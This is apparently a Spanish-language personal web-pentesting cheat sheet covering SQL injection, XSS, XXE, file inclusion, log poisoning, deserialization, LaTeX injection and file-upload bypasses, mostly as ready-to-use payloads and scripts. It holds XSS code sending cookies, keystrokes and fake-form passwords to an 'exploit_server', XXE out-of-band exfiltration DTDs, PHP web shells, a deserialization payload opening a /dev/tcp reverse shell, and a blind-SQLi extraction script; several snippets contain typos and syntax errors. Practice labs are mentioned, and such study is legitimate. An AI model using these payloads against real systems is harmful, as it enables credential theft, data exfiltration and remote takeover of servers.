	
----

## GIT 

>Esto no es una vuln pero es interesting


- Si vemos un http://target/.git, podemos ver password
```bash
wget http://target/.git
git clone http://target/.git
# En el directorio dond es eencuentra el .git
git log
git show Chorrocommit
```

## SQLI

> Todos los sqli manuales lo tendremos en la carpeta de [PuestaenProducción](Z:\Estudios\PuestaProduccion)
> El resto lo tendremos en **sqlmap** 😁

- **Hay veces que no hace falta aplicar** `'` **porque el programador ni siquiera obligó a ponerlas, por lo que simplemente haremos la siguiente consulta.**

https://ejepmlo.com/?user_id=1 order by 1

- Poner  un valor inexistente:

https://ejepmlo.com/?user_id=52676511 order by 1

>Automatizaremos esto con el siguiente script 

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import

def def_handler(sig, frame):
	print("\n\n[!] Saliendo ... \n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = input("¿Cuál es la URL objetivo?: ")
parametro = input("¿Cuál es el parámetro? (Ejemplo: ?parametroExistente=ValorInexistente): ")
tabla = input("¿Cómo se llama la tabla que has encontrado?: ")
columna1 = input("¿Cómo se llama la columna de users que has encontrado?: ")
columna2 = input("¿Cómo se llama la columna de passwds que has encontrado?: ")
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta" )
	p1.status("Iniciando proceso de fuerza bruta")
	
	time.sleep(2)
	
	p2 = log.progress("Datos extraídos")
	
	extracted_info = ""

	for position in range(1, 150): # caracteres a corregir si nos quedamos cortos 150
		for character in range(33, 126): # empezando desde el 33 hasta el 126
		sqli_url = f"{main_url}{parametro} or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from {tabla} where id = 1=%d)" % (position, character)"
		#esta es la query que s ehacía an tes --> sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
	
	# Ponerle la siguiente consulta si quiro saber los usersy passwds: f"{main_url}{parametro} or (select(select ascii(substring((select group_concat({columna1}, 0x3a ,{columna2}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)"
	
	# Ponerle la siguiente consulta si quiro saber los users: f"{main_url}{parametro} or (select(select ascii(substring((select group_concat({columna1}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)
	
	# Ponerle la siguiente consulta si quiro saber las passwds: f"{main_url}{parametro} or (select(select ascii(substring((select group_concat({columna2}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)

		p1.status(sqli_url)
		
		r = requests.get(sqli_url)
		
		if r.status_code == 200:
			extracted_info += chr(character)
			p2.status(extracted_info)
			break

if __name__ == '__main__':

	makeSQLI( )
```

## XSS

> Inyección JS para secuestrar el correo

- Código a inyectar

```javascript
<script>
	var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");
	
	if (email == null | | email == ""){
		alert("Es necesario introducir un correo válido para visualizar el post");
	} else {
		fetch( "http://exploit_server/?email=" + email);
</script>
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80
```

> Inyección JS para secuestrar el user y passwd

- Código a inyectar

```javascript
<div id="formContainer"></div>

<script>
	var email;
	var password;
	var form = '<form>' +
		'Email: <input type="email" id="email" required>' +
		' Contraseña: <input type="password" id="password" required>' +
		'<input type="button" onclick="submitForm()" value="Submit">' +
		'</form>';

}

document.getElementByld("formContainer").innerHTML = form;

	function submitForm() {
	email = document.getElementByld("email").value;
	password = document.getElementByld("password").value;
	fetch("http://exploit_server/?email="+ email + "&password=" + password);
}

</script>
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80
```


> Keylogger con JS

- Código a inyectar

```JS
<script>
	var k = "";
	document.onkeypress = function(e){
		e = e || window. event;
		k += e.key;
		var i = new Image();
		i.src = "http://exploit_server/" + k;
	};
</script>
```

- Para escuchar poner en la terminal
```python
	python3 -m http.server 80 2>&1 | grep -oP 'GET /\K[^.*\s]+'
```

>Secuestrar la cookie dough sin que la víctima vea el alert

- Archivo a inyectar en entrada de texto vulnerable
```JS
<script src="http://exploit_server:puerto/powned.js"></script>
```

- Contenido de JS malicioso

```JS
var request = new XMLHttpRequest( );
request.open('GET', 'http://exploit_server/?cookie=' + document.cookie);
request.send( );
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80 
```


>Hacer que la víctima visite la página que quiero 

- Código a inyectar
```JS
<script src="http://exploit_server:puerto/powned.js"></script>
```
- En el archivo **powned.js**
```JS
var request = new XMLHttpRequest( );
request.open('GET', 'http://valvonta.es/poraqui?parametro=active');
request.send( );
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80 
```

## XXE

> Utilizamos https://github.com/jbarone/xxelab.git para jugar

- Inyección XXE para visualizar archivo 
```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY tumai SYSTEM "file:///etc/passwd"> ]>
<root>
	<name>sds</name>
	<tel>sdf</tel>
	<email>&tumai;</email>
	<password>sdfs</password>
</root>
```

- Inyección XXE para inyectar comandos
```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY tumai SYSTEM "expect://ls"> ]>
<root>
	<name>sds</name>
	<tel>sdf</tel>
	<email>&tumai;</email>
	<password>sdfs</password>
</root>
```

- Inyección XXE representado en base64
```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY tumai SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<root>
	<name>sds</name>
	<tel>sdf</tel>
	<email>&tumai;</email>
	<password>sdfs</password>
</root>
```

- Inyección DTD external cuándo la APP no acepte entidades
> En la request
```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % tumai SYSTEM "https://exploitserver.com/exploit.dtd"> %tumai;]>
<root>
	<name>sds</name>
	<tel>sdf</tel>
	<email>&tumai;</email>
	<password>sdfs</password>
</root>
```

> En nuestro **mai.dtd** 
```DTD
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % evaluamos "<!ENTITY &#x25; exfiltramos SYSTEM 'http://192.168.1.135:8089/?packssx=%file;'>">
%evaluamos;
%exfiltramos;
```


```python
python3 -m http.server 8089
```

> En la request

```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % tumai SYSTEM "http://192.168.1.135:8089/mai.dtd">  %tumai;]> 
<root><name>sds</name><tel>sdf</tel><email>packs</email><password>sdfs</password></root>
```

> Automatización de external DTD en **shellscript**

```bash
echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious dtd="""
<! ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<! ENTITY % eval \" <! ENTITY &#x25; exfil SYSTEM 'http://exploit_server/?file=%file; '>\">
%eval;
%exfil; """

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

curl -s -X POST "http://ipaatacar:5000/rutavulnerable" -d ' <? xml version="1.0" encoding="UTF-8"?>
<! DOCTYPE foo [ <! ENTITY % xxe SYSTEM "http://exploit_server/malicious.dtd"> %xxe; ]>
<root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>nasfas</password></root>' &>/dev/null

cat response | grep -oP "/?file=\K[^ .* \s]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
```

## Local File Inclusion - Path Traversal

>Si la web a auditar tiene el siguiente código, fijarnos en **include()**

```php
<? php
	$filename = $_GET['filename' ];
	$filename = str_replace(" .. /", "", $filename);
	
	include("/var/www/html" . $filename . ".php");
?>
```

> Podemos intentar esto en los parámetros de entrada
```bash
/etc////.//////passwd
/etc//////////passwd
/etc/./././././passwd
/et?/passw?
/???/??a??
```

> Si tiene una versión PHP por debajo de la **5.3**
>Si el backend sanitiza así, diciendo que si las últimas 6 letras especificadas en el parámetro son passwd, no muestre nada

```php
php -r 'if(substr($argv[1],-6,6) != "passwd") include($argv[1]);' '/etc/passwd'; echo
 ```

> Podemos intentar esto

```bash
/etc/passwd/.
```

### Wrappers para LFI

> En parámetros de entrada que deduzcamos que interpreta php con **WRAPPERS**

`Http://web.com/index.php?page=course`

- Para inyectar pondríamos esto para ver el **source code**
`php://filter/convert.base64-encode/resource=index.php`

- **A partir de estos archivos vamos leyendo el resto a ver credenciales o algo más crítico**

>Lo mismo pero rota 13 posiciones las letras, por lo que si el backend sanitiza por la palabra php, no sabe qué es cuc en este caso

`http://localhost/?filename=php://filter/read=string.rot13/resource=secret.php`

![[Pasted image 20250317194631.png]]

- Para  traducir el texto
```bash
cat data | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-0]'
```

> También tenemos esto para que el backend no lo interprete

`http://localhost/?filename=php://filter/convert.iconv.utf-8.utf-16/resource=secret.php

> Wrapper por parámetro para inyectar instrucciones en el body de una petición HTTP 

```HTTP Request
POST /?filename=php://input HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html, application/xhtml+xml, application/xml; q=0.9,image/avif,image/webp,*/ *; q=0.8
Accept-Language: en-US, en; q=0.5
Accept-Encoding: gzip, deflate
DNT : 1
Connection: close
Cookie: PHPSESSID=8kvvf6gjk2fv05tqfsk1mjnse6
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Sec-GPC: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

<? php system("whomai"); ?>
```


>LFI con RCE

- Encodeo en **base64** lo siguiente
```php
<?php system($_GET["cmd"]); ?>
```

- Encodeo en URL los caracteres que den problemas como `+`

```HTTP
GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCk7ID8%2b%Cg==&cmd=whoami
```

> Espectacular tool que con un wrapper y encoding es capaz de ejecutar comandos, la salida del uso de la herramienta es lo que debes copiar en el parámetro inyectable 

- [ChainGenerator](https://github.com/synacktiv/php_filter_chain_generator)
```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

Salida de wrapper+encoding --> php://filter/convert.iconv.....etc
```

`http://webauditada.com/?paramInyectable=SalidaTool`

## RFI

> La Web  Interpreta la ruta de un tercero y ahí es cunado le colamos lo que queremos al ejecutarlo en la url (el archivo se debe llamar igual que lo que le server busca)

- Url  auditada

`http://web.com/?paramvulnerable=http://exploitserver.com/?wp-load.php`

- Contenido de **wp-load.php**

```php
<?php system($_GET["cmd"]); ?>
```

Una vez entablada la reverseshell
```bash
script /dev/null -c bash
ssty raw -echo ; fg # llevr netcat a 2 plano
reset xterm
ssty size # ver size de nuestra terminal
ssty rows loquemedigamiterminal columns loquemedigamiterminal # en la revshell
export TERM=xterm
```

## Log Poisoning

>Debemos enumerar logs a partir de un LFI

> Si tenemos acceso a **/var/log/pache2/access.log** podemos ver contenido si la función system de PHP está habilitada en el server

- Ver info php del sitio
```bash
curl -s -X GET "http://victima.com/victima" -H User-Agent: <?php phpinfo(); ?>
```
- Ejecutar comandos
```bash
curl -s -X GET "http://victima.com/victima" -H "User-Agent: <?php system('whoami'); ?>"
```
- Ejecutar comandos en la url
1. 
```bash
curl -s -X GET "http://victima.com/victima" -H "User-Agent: <?php system(\$_GET["cmd"]); ?>"
```
2. `&cmd=whoami`

> Contaminar **Logs ssh**

- Antes era **/var/log/auth.log**
- Ahora es el archivo **/var/log/btmp**
- Debemos tener permisos de lectura en **/var/log/btmp**

1. Escapar el dólar por discrepancias en linux
```bash
ssh '<?php system(\$_GET["cmd"]); ?>'@ip
```

2. /var/log/btmp&cmd=whoami

## CRSF


>Podemos **mandar un correo en el que podemos inyectra HTML** o en una **sección de  comentarios que se pueda inyectar HTML**, o pasarle a la víctima un http://exploit_server.com/index.html que lleve lo siguiente:

```html
<img src="http://sitiowebquelemandamosalavictima.com/?edit=parametros&sexo=sexualizante" height="1" width="1" alt="Lo que aparecería en el cuerpo del correo o comentario"/>
```

## SSRF

> Desde una URL podemos visitar un host de la red interna fuzzeando su puerto, escondiendo la línea que salen 3 caracteres para que salga sólo los que tienen diferentes caracteres 

```bash
wfuzz -c -t 200 -hl 3 -z range,1-65535 'http://172.17.02/algo.php?url=http://127.0.0.1:FUZZ
```

```bash
curl "172.17.02/algo.php?url=http://127.0.0.1:4646/login.html"
```

> Si hay subredes también lo podemos ver pero habría que averiguarlas

```bash
curl "172.17.02/algo.php?url=http://10.0.0.57:777/"
```

## SSTI

> Si con **whatweb** o **wappalyzer** veo **python** o **flask** que es una app que utiliza el motor **jinja2** podemos pensar que es SSTI

- Los payloads los tenemos en el repositorio de BurpsuiteTrainingLabs
- [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [MismoRepoVAriosMotores](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)
- [HActricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)

## CSTI (Client-Side template Injection)

1. Puede desembocar en un XSS
2. Atacaremos al cliente

> Webs

- [HackTricks-Clientside](https://book.hacktricks.wiki/es/pentesting-web/client-side-template-injection-csti.html)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md)

> Por ejemplo si tenemos el siguiente tenemos que bypassear angular encodeando la parte de Alert y ni siqquiera necesita comillas o comillas dobles aunque sea un string 😈
```JS
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

- En la consola del navegador para ver como funciona ponemos:

```JS
String.fromCharCode(97,98)
```

- Ahora hemos hecho un script para que nos lo ponga **directamente en el payload**
```python
import os

# Pedirle al usuario que ingrese la frase para el alert
frasote = input("Introduce lo que quieres pegar dentro del alert(Aqui): ")

# Crear un archivo temporal para guardar los valores ASCII
output = "/tmp/ascii_output.txt"

# Escribir los valores ASCII en el archivo con doble salto de línea
with open(output, "w") as f:
    for caracter in frasote:
        f.write(str(ord(caracter)) + "\n\n")

# Ejecutar el comando Linux para obtener los valores ASCII en una sola línea separados por comas
ascii_output = os.popen(f"cat {output} | xargs | tr ' ' ','").read().strip()

# Formatear el código JavaScript con el output embebido
js_code = f"""
{{
    c=''.sub.call;
    b=''.sub.bind;
    a=''.sub.apply;
    c.$apply=$apply;
    c.$eval=b;
    op=$root.$$phase;
    $root.$$phase=null;
    od=$root.$digest;
    $root.$digest=({{}}).toString;
    C=c.$apply(c);
    $root.$$phase=op;
    $root.$digest=od;
    B=C(b,c,b);
    $evalAsync("
    astNode=pop();
    astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert({ascii_output})))+';
    astNode.argument={{type:'Identifier',name:'foo'}};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);
    [].push.apply=m2;
    a=''.sub;
    $eval('a(b.c)');
    [].push.apply=a;
}}
"""

# Imprimir el código JavaScript con el output embebido
print(js_code)
```

----
## Padding Oracle

> Ataque contra datos cifrados que permite al atacante descifrarlos

1. Utiliza **CBC: Cipher BlockChaining**

- Se cifra de esta manera
![[Pasted image 20250321010737.png]]

#### Cifrado CBC 
- Una cadena con este cifrado tiene siempre **7 bytes**
- **Cada caracter es 1 byte**  u 8 bits
- Si no llega a los bytes se rellena con los siguientes valores --> 0x02 en cada casilla si faltan 2 bytes o 0x03 si faltasen 3
- Primero descifra y luego limpia el relleno 
- Si hubiese limpieza inválida ahí tenemos **Oracle Padding**

> Nos debemos dar cuenta de cuándo se acontece esa limpieza inválida

- Error
- Falta de resultados
- Respuesta lenta
- O partir de un texto en claro y cifrarlo

![[Captura de pantalla 2025-03-21 130554.png|750x300]]
- Operando con **XOR**^[1] con El bloque **Encrypted E7** ^ **Intermediate I15** = C15 
![[Captura de pantalla 2025-03-21 132604.png|700x300]]

>**XOR:** los 0^0 se representan con 0,los 1^1 se representan con un 0 y los 0^1 se representan como 1


Operación XOR

0110
^
1010

Resultado --> 1100

> Pasamos a descifrar una cookie que hemos detectado que es cifrada con CBC

- Debe ser **múltiplo de 8**
- En este caso crackeamos la cookie


```bash
pasbuster http://urlquesea.com cifradoacrackear 8 -cookie 'auth=cookieentera'
```

- La descifra en **2 bloques**

![[Pasted image 20250321190418.png|400]]

![[Pasted image 20250321190351.png|400]]

> Ahora enviaremos el user que suponemos que está autenticado

```bash
pasbuster http://urlquesea.com cifradoacrackear 8 -cookie 'auth=cookieentera' -plaintext 'user=admin'
 ```
- Nos da la cookie y nos logeamos en el browser
> Importante ver este Writeup [OraclePadding](https://www.vulnhub.com/entry/pentester-lab-padding-oracle,174/)

> Fuerza Bruta de **Bit Flipper con burpsuite**

 - Resulta que la cookie cambia en algunos bytes en toda la APP web , si el nombre de usuario es parecido al de admin y con burp vamos cambiando el relleno con un bruteforce

![[Pasted image 20250322003520.png]]

## Type  Juggling

> Conversión de un tipo de dato a otro de una variable en un programa, en este caso lo pasamos como un array

- En los parámetros enviados en la petición poner []

`username=admin&password[]=`

**TE DA ACCESO CON ESTO**

![[Pasted image 20250322005420.png]]


> Si el backedn tiene un hash md5 **0ertert8456df4df7e5r4bf4578d5s** y hasheamos una palabra y empieza por 0, lo que está comparando en el backend son 2 ceros esto es debido a que se almacena la contraseña como un número entero y no como un string.

**TIENE QUE EMPEZAR POR** 0e

```php
$value1 = 0ertert8456df4df7e5r4bf4578d5s;
$value2 = 0

# Está tratando los valores elevando 0^loquesea 
# Por lo tanto 0 = 0
```

- En la sanitización se debe poner `===` para que iguale los int(tipo de dato número)

- Crackeo: si hasheamos una palabra que empiece por 0, no comparará todo el string del hash si no sólo el 0 del primero, **a la aplicación le debemos de dar la palabra sin hashear**

>En PHP, una cadena que comienza con un número se convierte automáticamente en un número si se utiliza en una comparación numérica

> Buscar por hashes mágicos o 0e hash colision

- [Aquí hay hashes mágicos](https://www.hackplayers.com/2018/03/hashes-magicos-en-php-type-jugling.html)


## NoSQL

- Son BD que no utilizan **tablas o columnas** sino **documentos, clave-valores, grafos** etc...

>Utilizan bases de datos **NoSQL, como MongoDB, Cassandra y CouchDB**

- **PAYLOADS**

```bash
'||1||'
```

- [PayloadsAlltheThingsNoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md)
- [HAckTricksNoSqlInjection](https://book.hacktricks.wiki/es/pentesting-web/nosql-injection.html)

> En una petición que se envíe por **GET**, podemos cambiar el **Content-Type: application/x-www-form-urlencoded**
> y dejarlo de la siguiente manera, cambiando tbb el parámetro a JSON

![[Pasted image 20250322164509.png]]

## LDAP Injection

- Software para administrar la información de una empresa que utiliza Linux, como Active Directoy en Windows
- Tiramos tosos los cript de ldap de nmap al **Puerto 389**

```bash
nmap --script ldap\* -p339 172.27.0.1
```

- Una vez ya enumerado, recopilamos info

```bash
 ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```
- Filtrar por descripción a ver que sale 
```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=*))'
```

- Si el login está mal sanitizado podemos hacer:

`username=admin&password=*`
`username=a*&password=*`
`username=admin))%00&password=sddd`
`username=admin)(FUZZ=\*))%00&password=sddd`

- Brute Force a un atibuto con wfuzz, nos tendrá que soltar un código de estado **301**

```bash
wfuzz -c --hc=404,400,403 -w /home/kuser/cosas/repositorios/SecLists/Fuzzing/LDAP-active-directory-attributes.txt  -d 'username=admin)(FUZZ=*))%00&password=sddd' http://localhost:8080
```

admin)(FUZZ=\*))%00&password=sddd`

- Esta estructura tiene el fichero para crear un usuario en el sistema una vez ya enumerado
![[Pasted image 20250322180944.png]]

- Lo creamos con 
```bash
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f new-user.ldif
```


### Deserialization Attack

> Vulneraremos la parte de código sanitizada donde la web espera strings

> Detectamos Objetos serializados a través de Burp en el que envía un comando ping 

- Nos fijamos en que primero serializa y luego urlencodea
- Podemos aprovechar las funciones del propio código del server y crear nuestro código

> Código del server

```php
<? php

class pingTest {
public $ipAddress = "127.0.0.1";
public $isValid = False;
public $output = "";

function validate( ) {
if (!$this->isValid) {
if (filter_var($this->ipAddress, FILTER_VALIDATE_IP) )
}
$this->isValid = True;
}}
$this->ping();

}

public function ping( )
{
if ($this->isValid) {
$this->output = shell_exec("ping -c 3 $this->ipAddress");
}}}
if (isset($_POST['obj'])) {
$pingTest = unserialize(urldecode($_POST['obj']));
} else {
$pingTest = new pingTest;
}
$pingTest->validate();
```

- Creamos nuestro código, lo mandamos en el **repeater**
> nano serializeattack.php

```php
<? php
class pingTest {
public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/ip_atacante/puertoatacante 0>&1'";
public $isValid = True;
public $output = "";
}
echo urlencode(serialize(new pingTest));
``` 

```bash
php serializeattack.php
```

- Nos ponemos a la escucha
```bash
nc -nlvp 8989
```

> Ahora lo veremos con **node.js**

- Previous installs

```bash
npm install cookie-parser express node-serialize
```

- Código de server vulnerable

```JS
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);
```

- Execution de server por el puerto **3000*

```
noder server.js
```

>IIFE --> Inmediatly Invoke Function Expresion: HAcer la llamada del objetoa a serializar inemdiatamente

- Creamos nuestro código JS
```bash
nano serialize.js
```

```JS
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 }(), // IMPORTANTE ESTE paréntesis que es el IIFE
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
 }
```

```bash
node serialize.js
```

- Salida **(Que es lo que hay en la variable y de serialize.js)**
`{"rce":"_$$ND_FUNC$$_function(){n require('child_process' ).exec('id', function(error, stdout, stderr) { console.log(stdout) });\n }()"}`

- Entablamos una Revshell con [NodeJsShell](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)
```bash
python2.7 nodejsshell.py ipatacante puertoatacante
```

- Lo que nos de el anterior comando Lo ponemos en **serialize.js**
```bash
nano serialize.js
```

```JS
var y = {
 rce : function(){
 LO QUE NOS DA NODEJSSHELL.PY}(), // IMPORTANTE ESTE paréntesis que es el IIFE
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
 }
```

- Cogemos el output, depende como trate la web la serialización lo **encodeamos**, en este caso era en base64 y lo ponemos en el **repeater**

```bash
echo "datosSerializados" | base64 -w 0 ; echo
```


## LaTeX Injection

>Con estas inyeccione spodemos:

- Provocar un output en un pdf
- Incluir archivos  de la localmachine y ver ese archivo en la máquina que controlamos

- **popler-utils** convierte un pdf en texto para filtrar por cadenas

```bash
sudo apt install popler-utils
```


> Command Injection

- [PayloadAllTheThingsLaTeX](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md)
- [SalomonSecLaTeX](https://salmonsec.com/cheatsheets/exploitation/latex_injection)
- [HAckTricksLaTeX](https://book.hacktricks.wiki/en/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html)

- Script para automatizar la inyección en **LaTeX** y en este caso lee el fichero y extrae TODO el fichero, de laotra manera sólo extraería  1 línea

```bash
#!/bin/bash

# Variables globales
declare -r main_url="http://localhost/ajax.php" #Cambiar Target
filename=$1

if [ $1 ]; then
	read_file_to_line="%0A\read\file%20to\line"
	for i in $(seq 1 100); do
		file_to_download=$(curl -s -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$read_file_t
o_line0A\text{\line}%0A\closein\file&template=blank" | grep -i download | awk 'NF{print $NF}' ) # Cambiar parámetros si es necesario

		if [ $file_to_download ]; then
			wget $file_to_download &>/dev/null
			file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk 'NF{print $NF}' )
			pdftotext $file_to_convert
			file_to_read=$(echo $file_to_convert | sed 's/\.pdf/\.txt/' )
			rm $file_to_convert
			cat $file_to_read | head -n 1
			rm $file_to_read
			read_file_to_line+="%0A\read\file%20to\line"
		else
			read_file_to_line+="%0A\read\file%20to\line"
		fi
	done
else
echo -e "\n[!] Uso: $0 /etc/passwd\n\n"
fi
```

## Abuso de APIs

- En **Herramientas de desarrollador**,  --> Network --> XHR, podemos ver las peticiones más claramente
- Utilizaremos **Postman** para la auditoría de APIs como Javi Espejo me enseñó

#### Postman

> How to **install**?

```bash
wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz
sudo tar -xzf postman-linux-x64.tar.gz -C /opt
sudo ln -s /opt/Postman/Postman /usr/bin/postman
nano ~/.local/share/applications/Postman.desktop

# En el file anterior

[Desktop Entry]<br>Encoding=UTF-8<br>Name=Postman<br>Exec=/opt/Postman/app/Postman %U<br>Icon=/opt/Postman/app/resources/app/assets/icon.png<br>Terminal=false<br>Type=Application<br>Categories=Development;

postman
```


> En cada ataque es recomendable copiar el **JWT** o la cookie que te de la web y guardarla en Postman

- Si algo no funciona cambiar la versión de la API v1,v2,v3--> http://localhost:8888/identity/api/v2
- Si algo intentamos y no fucniona cambiar el método
- Ver tráfico con Postman a ver que info de otros users, en sus my-account o buscando su perfil si es público sin autenticarse como ese user

## File Upload

> Máquina para jugar [FileUploadTraining](https://github.com/moeinfatehi/file_upload_vulnerability_scenarios)
> Configurar máquina para las subidas --> 
> 

```bash
ls -d up*|while read line; do mkdir $line/uploads;chown -R www-data:www-data $line/uploads;done
```

- [HAcktricks](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
- [PayloadAllthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md)
- [OcultarPayloadEnImagen](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)
- [MoreTechniwues](https://thibaud-robin.fr/articles/bypass-filter-upload/)


Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
    - **Working in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

1. File upload normal
2. Le quitamos la función que valida el file en el JS y le subimos lo que queremos **Destacar que ni chrome ni brave en una config por defecto dejan hacer esto, SI FIREFOX**
3. Cambiar la extensión hasta que una de ellas entre
4. Subimos el archivo .htaccess de esta manera
- Subida de **.htaccess**
```BurpSuite
Content-Disposition: form-data; name="fileToUpload"; filename=".htaccess"
Content-Type: plain/text

AddType application/x-httpd-php .sergio
```
- Subida de archivo con extensión **.sergio**
```BurpSuite
Content-Disposition: form-data; name="fileToUpload"; filename="exploitcmd.sergio"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
```

5. Cambiar el MAX_File para cambiar el size
6. Cambiar el **MIME Type** a --> `image/jpeg`
7. De este modo
```Burpsuite
<?=`$_GET[0]`?>
```
- En la URL ponemos
`http://localhost:9001/uploads/archivosubido.php?0=id`
5. Cambiamos el **Mime TYPE** y añadimos al principio GIF8 o GIF89a:
```Burpsuite
Content-Type: image/gif

GIF89a;
<?php system($_GET['cmd']); ?>
```
8. 
- En el response salía uploads/b58805f51a4bffac8760ade5bc530d74.gif
- Por lo que están subiendo los archivos a la carpeta **uploads/** en md5 
- "-n" para no aplicar cambio d elínea por lo que el hash cambiará por completo
```bash
echo -n "nombredearchivo_siextension" | md5sum
```
- en la url ponemos uploads/salidamd5.php?cmd=id

9. Exactamente lo mismo que arriba pero con extensión
```bash
echo -n "exploitcmd.php" | md5sum 
```
- en la url ponemos uploads/salidamd5.php?cmd=id

10.  Vemos que tiene **40 caracteres** por lo que es **sha1sum**
- Subimos archivo 
- **hasheamos** todo el archivo

```bash
sha1sum exploitcmd.php
```
- Ponemos uploads/salidasha1sum.php?cmd=id
11. No nos chiva doónd eestá el directorio **/uploaeds**
- Subimos File
